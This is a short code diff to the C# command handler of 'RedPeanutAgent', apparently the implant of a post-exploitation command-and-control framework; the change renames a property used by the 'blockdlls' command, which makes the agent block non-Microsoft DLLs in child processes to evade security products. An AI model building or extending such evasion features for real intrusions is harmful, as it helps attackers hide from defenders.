@@ -396,7 +396,7 @@ namespace RedPeanutAgent
                                     commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", managed == true ? "Managed" : "Unmanaged"));
                                     break;
                                 case "blockdlls":
-                                    blockdlls = task.BlockDlls.Block;
+                                    blockdlls = task.BlockDllsTask.Block;
                                     Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
                                     if(blockdlls)
                                         commandManaged.SendResponse("[*] Agent now block non Microsoft Dlls in child process");
